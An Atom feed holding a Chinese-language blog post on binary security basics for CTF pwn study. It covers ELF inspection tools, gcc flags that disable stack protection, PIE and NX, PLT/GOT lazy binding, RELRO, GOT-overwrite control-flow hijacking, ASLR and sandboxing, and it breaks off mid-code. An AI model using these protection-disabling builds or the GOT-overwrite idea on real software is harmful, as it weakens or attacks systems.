<?xml version="1.0"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://alazymechnaic.github.io</id>
    <title>alazymachine • Posts by &#34;二进制安全&#34; tag</title>
    <link href="https://alazymechnaic.github.io" />
    <updated>2024-04-08T09:05:35.000Z</updated>
    <category term="paper" />
    <category term="fuzz" />
    <category term="arm" />
    <category term="Linux" />
    <category term="C" />
    <category term="go" />
    <category term="Paper" />
    <category term="bypass" />
    <category term="clash" />
    <category term="Hook" />
    <category term="go, RE" />
    <category term="kernel pwn" />
    <category term="binary" />
    <category term="writing" />
    <category term="HEAP PWN CTF" />
    <category term="Android" />
    <category term="dataflow" />
    <category term="pwn" />
    <category term="java" />
    <category term="web" />
    <category term="exploit" />
    <category term="network" />
    <category term="代码分析" />
    <category term="二进制安全" />
    <category term="渗透" />
    <category term="程序分析" />
    <category term="stack overflow" />
    <category term="算法" />
    <entry>
        <id>https://alazymechnaic.github.io/2024/04/08/er-jin-zhi-an-quan-ji-chu/</id>
        <title>二进制安全基础</title>
        <link rel="alternate" href="https://alazymechnaic.github.io/2024/04/08/er-jin-zhi-an-quan-ji-chu/"/>
        <content type="html">&lt;h2 id=&#34;需要装的工具&#34;&gt;&lt;a href=&#34;#需要装的工具&#34; class=&#34;headerlink&#34; title=&#34;需要装的工具&#34;&gt;&lt;/a&gt;需要装的工具&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/202404081706632.png&#34; alt=&#34;image-20220929231115939&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;常见命令&#34;&gt;&lt;a href=&#34;#常见命令&#34; class=&#34;headerlink&#34; title=&#34;常见命令&#34;&gt;&lt;/a&gt;常见命令&lt;/h2&gt;&lt;figure class=&#34;highlight sh&#34;&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs sh&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;## 反汇编指令&lt;/span&gt;&lt;br&gt;objdump -d -M intel&lt;br&gt;readelf -a &lt;span class=&#34;hljs-comment&#34;&gt;# 输出所有的elf的文件信息&lt;/span&gt;&lt;br&gt;nm &lt;span class=&#34;hljs-comment&#34;&gt;# 用于看所有的函数&lt;/span&gt;&lt;br&gt;hexdump &lt;span class=&#34;hljs-comment&#34;&gt;# 用于查看十六进制&lt;/span&gt;&lt;br&gt;&lt;br&gt;ldd &lt;span class=&#34;hljs-comment&#34;&gt;# 查看使用的函数所在动态链接库的位置&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;# GCC的使用&lt;/span&gt;&lt;br&gt;gcc 文件.C -s 目标.s  &lt;span class=&#34;hljs-comment&#34;&gt;# 该指令得到的是一个汇编指令构成的asc码文件，但是得到的是att的汇编指令&lt;/span&gt;&lt;br&gt;gcc -no-pie &lt;span class=&#34;hljs-comment&#34;&gt;# 关闭pie&lt;/span&gt;&lt;br&gt;gcc -m32 &lt;span class=&#34;hljs-comment&#34;&gt;# 进行32位编译，需要装一些依赖&lt;/span&gt;&lt;br&gt;gcc -static &lt;span class=&#34;hljs-comment&#34;&gt;#使用静态链接,也就是将动态链接库直接写进二进制文件中，call的时候是一个实际地址，正常连接的时候call的是一个偏移量&lt;/span&gt;&lt;br&gt;-fomit-frame-pointer &lt;span class=&#34;hljs-comment&#34;&gt;# 编译后就忽略rbp寄存器，代码里也就没有开栈操作，直接依照rsp间接寻址&lt;/span&gt;&lt;br&gt;-fno-omit-frame-pointer &lt;span class=&#34;hljs-comment&#34;&gt;# 保留push rbp, mov rsp,rbp&lt;/span&gt;&lt;br&gt;-O1 &lt;span class=&#34;hljs-comment&#34;&gt;# 默认的编译优化等级，O3后就有可能会将某些代码优化，导致攻击失败&lt;/span&gt;&lt;br&gt;-no-pie &lt;span class=&#34;hljs-comment&#34;&gt;# 关闭地址随机化&lt;/span&gt;&lt;br&gt;gcc -fno-stack-protector -o &lt;span class=&#34;hljs-built_in&#34;&gt;test&lt;/span&gt; test.c //禁用栈保护&lt;br&gt;gcc -fstack-protector -o &lt;span class=&#34;hljs-built_in&#34;&gt;test&lt;/span&gt; test.c //启用堆栈保护，不过只为局部变量中含有 char 数组的函数插入保护代码&lt;br&gt;gcc -fstack-protector-all -o &lt;span class=&#34;hljs-built_in&#34;&gt;test&lt;/span&gt; test.c //启用堆栈保护，为所有函数插入保护代码&lt;br&gt;-z execstack / -z noexecstack (关闭 / 开启) 栈保护&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;# gdb指令&lt;/span&gt;&lt;br&gt;-Wl,--dynamic-linker=/动态连接器的路径/ld-linux-x86-64.so.2 &lt;span class=&#34;hljs-comment&#34;&gt;#指定libc版本编译&lt;/span&gt;&lt;br&gt;&lt;br&gt;distance addr_a addr_b &lt;span class=&#34;hljs-comment&#34;&gt;# 计算两个地址之间有多远&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h2 id=&#34;常见容易混淆概念&#34;&gt;&lt;a href=&#34;#常见容易混淆概念&#34; class=&#34;headerlink&#34; title=&#34;常见容易混淆概念&#34;&gt;&lt;/a&gt;常见容易混淆概念&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;编译是由编译器完成的，高级语言的代码由编译器将其变为汇编代码（也就是gcc -s后得到的东西），这个根据使用的编译器不同，得到的结果也不同&lt;/li&gt;
&lt;li&gt;汇编 则是将汇编代码变成机器码，这个是没有异议的，完全相同。&lt;/li&gt;
&lt;li&gt;64位后的各种指令架构的寄存器，除了rip和flag寄存器外，其余都可以随便用。&lt;ul&gt;
&lt;li&gt;RSP存放的是当前的栈顶的地址：surface？&lt;/li&gt;
&lt;li&gt;RBP是用于存放当前栈帧的栈底地址：base？&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;关于-plt与-got&#34;&gt;&lt;a href=&#34;#关于-plt与-got&#34; class=&#34;headerlink&#34; title=&#34;关于.plt与.got&#34;&gt;&lt;/a&gt;关于.plt与.got&lt;/h2&gt;&lt;h3 id=&#34;延迟绑定技术&#34;&gt;&lt;a href=&#34;#延迟绑定技术&#34; class=&#34;headerlink&#34; title=&#34;延迟绑定技术&#34;&gt;&lt;/a&gt;延迟绑定技术&lt;/h3&gt;&lt;p&gt;由于在实际运行的过程中并不会将外部函数的地址写到elf文件中，因为在装载动态链接库的时候会对动态链接库进行重定位。延迟绑定主要依赖的是plt，plt表其实是一种模糊的引用方式。这种方式用于避免在实际动态加载so的时候，一次性将所有的动态链接库加载进来，而是用到哪个加载哪个。主要依赖于_dl_runtime_resovlve(module, function)函数来实现。动态链接库加载进入内存地址后&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/202404081706623.png&#34; alt=&#34;image-20220926234935798&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;由上图基本上能够得到一个完整的流程，上图是外部函数在首次执行时的情况&lt;/li&gt;
&lt;li&gt;首先在call指令执行过后会直接到plt表的对应表项中，该表由三条指令构成&lt;ul&gt;
&lt;li&gt;第一条指令是个jmp *addr，初始状态下该addr中存储的内容其实就是jmp的下一条指令，也就是下面的push，其实就是直接走向下条指令&lt;/li&gt;
&lt;li&gt;第二条指令是将向栈中push一个值，这个值的目的是用于索引当前要找的是哪个函数，这个后面会提到&lt;/li&gt;
&lt;li&gt;第三条指令直接是个无条件跳转，这个跳转就是无脑跳转到一个固定的地址，这个地址就是_dl_runtime_resolve函数的位置，该函数位于代码段，有该函数来帮助程序找到对应的代码位置。其实这个函数也需要一个plt表项，因此这一步跳转的位置还是在所谓common@plt为的位置。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/202404081706643.png&#34; alt=&#34;image-20220926235654981&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;_dl_runtime_resolve会去做两件事，一件事是将plt表的第一项，也就是那个间接的jmp *addr中addr所存储的内容改为真正的函数地址（其实这个addr就是在got范围内的），这样在第二次使用该函数的时候就不必再用到got。&lt;ul&gt;
&lt;li&gt;那么这个函数是怎么找到对应的函数的呢？elf文件中保存了.rel.plt保存了重定位表的信息，该重定位表中存储了该函数对应的got表项的地址，也就是上面的jmp *addr中的addr&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;根据上面能够看到plt表的第一个就是_dl_runtime_resolve函数的表项，其对应的内容在got[2]的位置，前两个分别是.dynamic段的装载地址和本ELF的link_map数据及结构描述符地址。但在编译时，无法获取知道link_map地址和_dl_runtime_resolve函数地址，所以编译时填零地址，进程启动时由动态链接器进行填充&lt;/li&gt;
&lt;li&gt;注意！plt段在text段，可读可执行，got表在data段，可读可写（因此也有了覆盖got技术）&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/202404081706651.png&#34; alt=&#34;image-20220927000902698&#34;&gt;&lt;/p&gt;
&lt;p&gt;在使用之后就可以直接跳转&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;因此可以使用覆盖got表的方式，来劫持控制流，但是如果开启relo之后就不行了&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;防御方式：&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Partial RELRO&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs&#34;&gt;现在gcc 默认编译就是 partial relro
some sections(.init_array .fini_array .jcr .dynamic .got) are marked as read-only after they have been initialized by the dynamic loader
non-PLT GOT is read-only (.got)
GOT is still writeable (.got.plt)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Full RELRO&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs&#34;&gt;拥有 Partial RELRO 的所有特性
lazy resolution 是被禁止的，所有导入的符号都在 startup time 被解析
bonus: the entire GOT is also (re)mapped as read-only or the .got.plt section is completely initialized with the final addresses of the target functions (Merge .got and .got.plt to one section .got). Moreover,since lazy resolution is not enabled, the GOT[1] and GOT[2] entries are not initialized. GOT[0] is a the address of the module’s DYNAMIC section. GOT[1] is the virtual load address of the link_map, GOT[2] is the address for the runtime resolver function。
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;关于.got.plt表，其实是got表的一部分，用来存储链接后的地址&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;rel-plt&#34;&gt;&lt;a href=&#34;#rel-plt&#34; class=&#34;headerlink&#34; title=&#34;.rel.plt&#34;&gt;&lt;/a&gt;.rel.plt&lt;/h3&gt;&lt;p&gt;.rel.plt节里面记录的是重定位表的信息，所有外部过程调用符号的重定位信息会出现在这个节区中。与之类似的节区还有个.rel.dyn节，这里面的每个表项对应了除了外部过程调用的符号以外的所有重定位对象，比如引用外部的全局变量等。.rel.dyn和.rel.plt节中每个重定位项记录了重定位的操作地址（r_offset），重定位类型的信息和符号的符号表索引（r_info），这两个节区实际上就是Elf32_Rel/Elf64_Rel结构体数组。&lt;/p&gt;
&lt;h3 id=&#34;plt&#34;&gt;&lt;a href=&#34;#plt&#34; class=&#34;headerlink&#34; title=&#34;.plt&#34;&gt;&lt;/a&gt;.plt&lt;/h3&gt;&lt;p&gt;.plt节中存放的是需要重定位的外部调用的符号，.plt[0]存放的是更新GOT表中动态链接符号加载地址的操作——将.got.plt[1]中存放的link_map结构体压入栈作为下一步的函数参数，跳转到.got.plt[2]执行动态链接器符号解析函数_dl_runtime_resolve。在延迟绑定场景，.plt[0]的执行会在外部函数第一次调用的时候进行，在该场景中符号的GOT表内容会被初始化为.plt[0]的地址，在执行过plt[0]的操作后会被更新为符号的加载地址&lt;/p&gt;
&lt;h3 id=&#34;plt-got&#34;&gt;&lt;a href=&#34;#plt-got&#34; class=&#34;headerlink&#34; title=&#34;.plt.got&#34;&gt;&lt;/a&gt;.plt.got&lt;/h3&gt;&lt;p&gt;.plt.got节是用于存放 __cxa_finalize 函数对应的 PLT 条目。&lt;/p&gt;
&lt;h3 id=&#34;got&#34;&gt;&lt;a href=&#34;#got&#34; class=&#34;headerlink&#34; title=&#34;.got&#34;&gt;&lt;/a&gt;.got&lt;/h3&gt;&lt;p&gt;.got节是运行时只读的，可以用于存放全局变量的地址，也可以用于存放不需要延迟绑定的函数的地址。所以很明显，got表是不能动的，相反，got.plt是能动的&lt;/p&gt;
&lt;h3 id=&#34;got-plt&#34;&gt;&lt;a href=&#34;#got-plt&#34; class=&#34;headerlink&#34; title=&#34;.got.plt&#34;&gt;&lt;/a&gt;.got.plt&lt;/h3&gt;&lt;p&gt;.got.plt是运行时可读写的，在延迟绑定过程中与 .plt 一起使用，如果关闭了延迟绑定则没有该节。&lt;br&gt;.got.plt[1]存放了link_map结构体的地址，.gotplt[2]存放了_dl_runtime_resolve函数的地址，后面的各项则用于存放函数的加载地址，在使用延迟绑定的时候这些项里会统一初始化为.plt[0]的地址，用于执行_dl_runtime_resolve函数，在执行完成后会被重新初始化为函数的加载地址，在下一次调用的时候就会直接调用了，因此.got.plt必须是运行时可读写的&lt;/p&gt;
&lt;h3 id=&#34;rel-dyn&#34;&gt;&lt;a href=&#34;#rel-dyn&#34; class=&#34;headerlink&#34; title=&#34;.rel.dyn&#34;&gt;&lt;/a&gt;.rel.dyn&lt;/h3&gt;&lt;p&gt;&lt;a href=&#34;https://so.csdn.net/so/search?q=%E9%87%8D%E5%AE%9A%E5%90%91&amp;amp;spm=1001.2101.3001.7020&#34;&gt;重定向&lt;/a&gt;表，在程序启动时就需要重定位完成。&lt;/p&gt;
&lt;h4 id=&#34;rel-plt-1&#34;&gt;&lt;a href=&#34;#rel-plt-1&#34; class=&#34;headerlink&#34; title=&#34;.rel.plt&#34;&gt;&lt;/a&gt;.rel.plt&lt;/h4&gt;&lt;p&gt;保存了重定位表的信息，可以使用lazy的连接方式&lt;/p&gt;
&lt;h3 id=&#34;fini和init段&#34;&gt;&lt;a href=&#34;#fini和init段&#34; class=&#34;headerlink&#34; title=&#34;fini和init段&#34;&gt;&lt;/a&gt;fini和init段&lt;/h3&gt;&lt;p&gt;init_array数组里面的函数都会一一执行，而且main函数结束后还会执行fini_array数组里面的函数，并且倒序执行&lt;/p&gt;
&lt;h2 id=&#34;重定位表（Relocation-Table）&#34;&gt;&lt;a href=&#34;#重定位表（Relocation-Table）&#34; class=&#34;headerlink&#34; title=&#34;重定位表（Relocation Table）&#34;&gt;&lt;/a&gt;重定位表（Relocation Table）&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;重定位表（Relocation Table）用于在程序加载到内存中时，进行内存地址的修正。为什么要进行内存地址的修正？我们举个例子来说：test.exe可执行程序需要三个动态链接库dll（a.dll，b.dll，c.dll），&lt;strong&gt;假设test.exe的ImageBase为400000H，而a.dll、b.dll、c.dll的基址ImageBase均为1000000H&lt;/strong&gt;。 &lt;/li&gt;
&lt;li&gt;因此在装载到内存中时，每个库肯定不会装载到1000000H的位置，但是每个库中存在一些写死的地址，这个地址是与1000000H相关的绝对地址。因此需要在使用的时候进行修正，由于每个动态链接库所装载的位置不相同，需要一个数据结构来记录这些偏移，这个修正的数据结构就是重定位表。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;a href=&#34;https://www.freesion.com/article/7648134308/&#34;&gt;https://www.freesion.com/article/7648134308/&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&#34;动态链接库操作&#34;&gt;&lt;a href=&#34;#动态链接库操作&#34; class=&#34;headerlink&#34; title=&#34;动态链接库操作&#34;&gt;&lt;/a&gt;动态链接库操作&lt;/h3&gt;&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;# 构造两个文件，一个a.h,一个a.c，a.c就正常声明函数&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;// a.c&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;#&lt;span class=&#34;hljs-keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&#34;a.h&#34;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-type&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;hljs-title function_&#34;&gt;hello&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;()&lt;/span&gt;&lt;br&gt;{&lt;br&gt;    &lt;span class=&#34;hljs-built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&#34;this is in hello...\n&#34;&lt;/span&gt;);&lt;br&gt;}&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;// a.h 的作用相当于对文件中的函数做一个注册行为&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;#&lt;span class=&#34;hljs-keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;#&lt;span class=&#34;hljs-keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-type&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;hljs-title function_&#34;&gt;hello&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;()&lt;/span&gt;;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;// 需要使用的文件中直接进行include head文件即可&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;#&lt;span class=&#34;hljs-keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&#34;hello.h&#34;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;hljs-title function_&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;()&lt;/span&gt;&lt;br&gt;{&lt;br&gt;    hello();&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;;&lt;br&gt;}&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;// gcc hello.c -shared -fPIC -o libhello.so # 用于生成动态链接库，此处的&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;// 在使用动态链接库的时候只要进行在文件中进行include一下a.h即可  gcc test.c -L. -l hello  -no-pie -o testhello, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;// -L 表明使用的动态链接库在当前文件夹下，-l 后面跟动态链接库的名称，编译器会自动在前后补齐lib和.so的部分&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;// export LD_LIBRARY_PATH=~/Desktop/Test_Project/getso:$LD_LIBRARY_PATH 执行完该指令后才会从目标路径中找到对应的库文件，否则显示找不到动态链接库&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;// ldd file 指令用于查看当前文件中的动态链接库依赖有哪些&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;h2 id=&#34;常见的内存保护方式&#34;&gt;&lt;a href=&#34;#常见的内存保护方式&#34; class=&#34;headerlink&#34; title=&#34;常见的内存保护方式&#34;&gt;&lt;/a&gt;常见的内存保护方式&lt;/h2&gt;&lt;h3 id=&#34;NX（No-execute）：&#34;&gt;&lt;a href=&#34;#NX（No-execute）：&#34; class=&#34;headerlink&#34; title=&#34;NX（No-execute）：&#34;&gt;&lt;/a&gt;NX（No-execute）：&lt;/h3&gt;&lt;p&gt;.data .bss等标记为不可执行，堆栈等均不可执行，传统的修改GOT表的方式不再可行。但是无法阻止代码重用攻击ret2libc。编译时加入-z execstack参数即可关闭该保护方式&lt;/p&gt;
&lt;h3 id=&#34;stack-canaries：&#34;&gt;&lt;a href=&#34;#stack-canaries：&#34; class=&#34;headerlink&#34; title=&#34;stack canaries：&#34;&gt;&lt;/a&gt;stack canaries：&lt;/h3&gt;&lt;p&gt;栈保护机制，当该机制开启时会在栈中压入一个随机值，防止进行栈溢出后，该随机值被修改，使用-fno-stack-protector编译选项则会关闭程序的stack canary。canary的值位于rbp上面，也就是在push rbp之后才会开始完成的内容&lt;/p&gt;
&lt;p&gt;在函数执行结束后会有检查canary内容是否和先前相似的代码，如果不同则返回stack_chk_fail&lt;/p&gt;
&lt;h3 id=&#34;RELO&#34;&gt;&lt;a href=&#34;#RELO&#34; class=&#34;headerlink&#34; title=&#34;RELO&#34;&gt;&lt;/a&gt;RELO&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;重定位机制&lt;/li&gt;
&lt;li&gt;Partial RELO的got表本身是可写的，但是full relo的重定位表本身不可写&lt;/li&gt;
&lt;li&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;ASLR与PIE&#34;&gt;&lt;a href=&#34;#ASLR与PIE&#34; class=&#34;headerlink&#34; title=&#34;ASLR与PIE&#34;&gt;&lt;/a&gt;ASLR与PIE&lt;/h3&gt;&lt;h4 id=&#34;ASLR：&#34;&gt;&lt;a href=&#34;#ASLR：&#34; class=&#34;headerlink&#34; title=&#34;ASLR：&#34;&gt;&lt;/a&gt;ASLR：&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;address space layout randomizatio: 也就是地址空间随机化，是一种系统功能，在系统将文件装入内存时产生作用，主要针对的内容如下：&lt;ul&gt;
&lt;li&gt;栈基地址，共享库，mmap基地址，堆地址（这也就是为什么开了ASLR后需要进行堆基地址的泄露&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;PIE：&#34;&gt;&lt;a href=&#34;#PIE：&#34; class=&#34;headerlink&#34; title=&#34;PIE：&#34;&gt;&lt;/a&gt;PIE：&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;Position - Independent Executable，编译器的功能之一，其主要目的在于对代码段，数据段以及bss段的随机化，将程序的基地址加载到一个任意位置（但是各个段之间的相对位置是固定的）&lt;/li&gt;
&lt;li&gt;关闭地址随机化后，静态地址就是实际运行地址。开启pie后，静态编译的地址就只是单纯的偏移量&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/202404081706659.png&#34; alt=&#34;image-20221002153747977&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;不常见的保护方式&#34;&gt;&lt;a href=&#34;#不常见的保护方式&#34; class=&#34;headerlink&#34; title=&#34;不常见的保护方式&#34;&gt;&lt;/a&gt;不常见的保护方式&lt;/h2&gt;&lt;h3 id=&#34;沙箱保护ORW&#34;&gt;&lt;a href=&#34;#沙箱保护ORW&#34; class=&#34;headerlink&#34; title=&#34;沙箱保护ORW&#34;&gt;&lt;/a&gt;沙箱保护ORW&lt;/h3&gt;&lt;p&gt;​	沙盒机制也就是我们常说的沙箱，英文名 sandbox ，是计算机领域的虚拟技术，常见于安全方向。一般说来，我们会将不受信任的软件放在沙箱中运行，一旦该软件有恶意行为，则禁止该程序的进一步运行，不会对真实系统造成任何危害。在 ctf 的 pwn 题中一般有两种函数调用方式实现沙盒机制，第一种是对 prctl 函数调用，第二种是使用 seccomp 库函数。&lt;/p&gt;
&lt;h4 id=&#34;prctl函数&#34;&gt;&lt;a href=&#34;#prctl函数&#34; class=&#34;headerlink&#34; title=&#34;prctl函数&#34;&gt;&lt;/a&gt;prctl函数&lt;/h4&gt;&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;#&lt;span class=&#34;hljs-keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;lt;sys/prctl.h&amp;gt;&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;hljs-title function_&#34;&gt;prctl&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(&lt;span class=&#34;hljs-type&#34;&gt;int&lt;/span&gt; option, &lt;span 